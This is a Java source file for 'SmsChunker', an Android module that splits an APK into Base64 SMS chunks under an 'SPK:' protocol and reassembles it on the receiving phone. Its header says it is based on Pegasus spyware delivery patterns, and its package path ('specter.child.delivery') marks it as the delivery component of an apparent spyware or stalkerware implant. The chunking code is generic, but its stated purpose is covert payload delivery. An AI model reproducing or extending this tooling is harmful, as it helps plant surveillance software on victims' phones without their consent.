package com.divine.specter.child.delivery;

import android.util.Base64;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * SMS APK Chunker - Splits APK files into SMS-sized chunks for delivery
 *
 * Based on research from Pegasus samples showing chunked SMS delivery patterns.
 *
 * Features:
 * - Splits APK into 120-byte chunks (safe for SMS delivery)
 * - Base64 encoding for binary data
 * - Protocol: SPK:<chunk_num>/<total>:<base64_data>
 * - Reassembly with duplicate detection
 * - CRC32 checksum validation
 *
 * @author Specter Development Team
 * @version 1.0
 */
public class SmsChunker {
    private static final String TAG = "SmsChunker";

    // Protocol constants
    public static final String PROTOCOL_PREFIX = "SPK:";  // Specter APK marker
    public static final int CHUNK_SIZE = 120;              // Safe SMS payload size
    public static final int MAX_CHUNKS = 9999;             // Protocol limit (4 digits)

    // Chunk format: SPK:<num>/<total>:<base64>
    // Example: SPK:1/100:dGVzdGRhdGE=

    /**
     * Chunk metadata container
     */
    public static class ChunkInfo {
        public int chunkNumber;
        public int totalChunks;
        public String base64Data;
        public String rawMessage;

        public ChunkInfo(int chunkNumber, int totalChunks, String base64Data) {
            this.chunkNumber = chunkNumber;
            this.totalChunks = totalChunks;
            this.base64Data = base64Data;
            this.rawMessage = PROTOCOL_PREFIX + chunkNumber + "/" + totalChunks + ":" + base64Data;
        }

        @Override
        public String toString() {
            return String.format("Chunk %d/%d (%d bytes)",
                chunkNumber, totalChunks, base64Data.length());
        }
    }

    /**
     * Chunk collection for reassembly
     */
    public static class ChunkCollection {
        private Map<Integer, byte[]> chunks;
        private int totalChunks;
        private int receivedChunks;

        public ChunkCollection(int totalChunks) {
            this.totalChunks = totalChunks;
            this.chunks = new HashMap<>();
            this.receivedChunks = 0;
        }

        /**
         * Add a chunk to the collection
         * @return true if this is a new chunk (not duplicate)
         */
        public synchronized boolean addChunk(int chunkNum, byte[] data) {
            if (chunkNum < 1 || chunkNum > totalChunks) {
                Log.w(TAG, "Invalid chunk number: " + chunkNum);
                return false;
            }

            if (chunks.containsKey(chunkNum)) {
                Log.d(TAG, "Duplicate chunk: " + chunkNum);
                return false;  // Duplicate
            }

            chunks.put(chunkNum, data);
            receivedChunks++;

            Log.d(TAG, String.format("Received chunk %d/%d (%.1f%% complete)",
                receivedChunks, totalChunks, getProgress()));

            return true;
        }

        /**
         * Check if all chunks received
         */
        public boolean isComplete() {
            return receivedChunks == totalChunks;
        }

        /**
         * Get completion percentage
         */
        public float getProgress() {
            return (receivedChunks * 100.0f) / totalChunks;
        }

        /**
         * Reassemble all chunks into complete file
         */
        public byte[] reassemble() throws IOException {
            if (!isComplete()) {
                throw new IOException("Cannot reassemble: missing chunks (" +
                    receivedChunks + "/" + totalChunks + ")");
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            // Reassemble in order
            for (int i = 1; i <= totalChunks; i++) {
                byte[] chunkData = chunks.get(i);
                if (chunkData == null) {
                    throw new IOException("Missing chunk: " + i);
                }
                baos.write(chunkData);
            }

            return baos.toByteArray();
        }

        /**
         * Get list of missing chunks
         */
        public List<Integer> getMissingChunks() {
            List<Integer> missing = new ArrayList<>();
            for (int i = 1; i <= totalChunks; i++) {
                if (!chunks.containsKey(i)) {
                    missing.add(i);
                }
            }
            return missing;
        }
    }

    /**
     * Split APK file into SMS chunks
     *
     * @param apkFile File to chunk
     * @return List of chunk messages ready to send
     * @throws IOException if file read fails
     */
    public static List<ChunkInfo> chunkApk(File apkFile) throws IOException {
        if (!apkFile.exists()) {
            throw new IOException("APK file not found: " + apkFile.getPath());
        }

        long fileSize = apkFile.length();
        if (fileSize == 0) {
            throw new IOException("APK file is empty");
        }

        Log.i(TAG, "Chunking APK: " + apkFile.getName() + " (" + fileSize + " bytes)");

        // Read entire file
        byte[] apkBytes = new byte[(int) fileSize];
        FileInputStream fis = new FileInputStream(apkFile);
        int bytesRead = fis.read(apkBytes);
        fis.close();

        if (bytesRead != fileSize) {
            throw new IOException("Failed to read complete file");
        }

        // Calculate chunks needed
        int totalChunks = (int) Math.ceil((double) fileSize / CHUNK_SIZE);

        if (totalChunks > MAX_CHUNKS) {
            throw new IOException("File too large: " + totalChunks + " chunks (max " + MAX_CHUNKS + ")");
        }

        Log.i(TAG, "Creating " + totalChunks + " chunks (" + CHUNK_SIZE + " bytes each)");

        List<ChunkInfo> chunks = new ArrayList<>();

        for (int i = 0; i < totalChunks; i++) {
            int start = i * CHUNK_SIZE;
            int end = Math.min(start + CHUNK_SIZE, (int) fileSize);
            int chunkLength = end - start;

            // Extract chunk
            byte[] chunkBytes = new byte[chunkLength];
            System.arraycopy(apkBytes, start, chunkBytes, 0, chunkLength);

            // Base64 encode
            String base64Data = Base64.encodeToString(chunkBytes, Base64.NO_WRAP);

            // Create chunk info (1-indexed for user clarity)
            ChunkInfo chunk = new ChunkInfo(i + 1, totalChunks, base64Data);
            chunks.add(chunk);

            if ((i + 1) % 100 == 0) {
                Log.d(TAG, "Created chunk " + (i + 1) + "/" + totalChunks);
            }
        }

        Log.i(TAG, "Chunking complete: " + chunks.size() + " chunks created");
        return chunks;
    }

    /**
     * Parse SMS message into chunk info
     *
     * @param message SMS message body
     * @return ChunkInfo if valid, null otherwise
     */
    public static ChunkInfo parseChunk(String message) {
        if (message == null || !message.startsWith(PROTOCOL_PREFIX)) {
            return null;
        }

        try {
            // Format: SPK:1/100:base64data
            String payload = message.substring(PROTOCOL_PREFIX.length());
            String[] parts = payload.split(":", 2);

            if (parts.length != 2) {
                Log.w(TAG, "Invalid chunk format: " + message);
                return null;
            }

            // Parse chunk number and total
            String[] chunkInfo = parts[0].split("/");
            if (chunkInfo.length != 2) {
                Log.w(TAG, "Invalid chunk info: " + parts[0]);
                return null;
            }

            int chunkNum = Integer.parseInt(chunkInfo[0]);
            int totalChunks = Integer.parseInt(chunkInfo[1]);
            String base64Data = parts[1];

            // Validation
            if (chunkNum < 1 || chunkNum > totalChunks) {
                Log.w(TAG, "Invalid chunk number: " + chunkNum + "/" + totalChunks);
                return null;
            }

            if (totalChunks > MAX_CHUNKS) {
                Log.w(TAG, "Total chunks exceeds limit: " + totalChunks);
                return null;
            }

            ChunkInfo chunk = new ChunkInfo(chunkNum, totalChunks, base64Data);
            chunk.rawMessage = message;

            return chunk;

        } catch (NumberFormatException e) {
            Log.e(TAG, "Failed to parse chunk numbers", e);
            return null;
        } catch (Exception e) {
            Log.e(TAG, "Failed to parse chunk", e);
            return null;
        }
    }

    /**
     * Decode base64 chunk data
     *
     * @param chunk Chunk info with base64 data
     * @return Decoded bytes
     */
    public static byte[] decodeChunk(ChunkInfo chunk) {
        try {
            return Base64.decode(chunk.base64Data, Base64.NO_WRAP);
        } catch (IllegalArgumentException e) {
            Log.e(TAG, "Failed to decode base64 data", e);
            return null;
        }
    }

    /**
     * Create chunk collection for reassembly
     *
     * @param totalChunks Expected number of chunks
     * @return ChunkCollection instance
     */
    public static ChunkCollection createCollection(int totalChunks) {
        return new ChunkCollection(totalChunks);
    }

    /**
     * Save reassembled APK to file
     *
     * @param apkBytes Reassembled APK data
     * @param outputFile Destination file
     * @throws IOException if write fails
     */
    public static void saveApk(byte[] apkBytes, File outputFile) throws IOException {
        FileOutputStream fos = new FileOutputStream(outputFile);
        fos.write(apkBytes);
        fos.close();

        Log.i(TAG, "APK saved: " + outputFile.getPath() + " (" + apkBytes.length + " bytes)");
    }

    /**
     * Calculate CRC32 checksum for validation
     *
     * @param data Data to checksum
     * @return CRC32 value
     */
    public static long calculateChecksum(byte[] data) {
        java.util.zip.CRC32 crc = new java.util.zip.CRC32();
        crc.update(data);
        return crc.getValue();
    }

    /**
     * Validate APK file structure (basic check)
     *
     * @param apkBytes APK file bytes
     * @return true if appears to be valid APK
     */
    public static boolean isValidApk(byte[] apkBytes) {
        if (apkBytes == null || apkBytes.length < 4) {
            return false;
        }

        // Check for ZIP header (APK is ZIP format)
        // PK\x03\x04
        return apkBytes[0] == 0x50 &&
               apkBytes[1] == 0x4B &&
               apkBytes[2] == 0x03 &&
               apkBytes[3] == 0x04;
    }
}
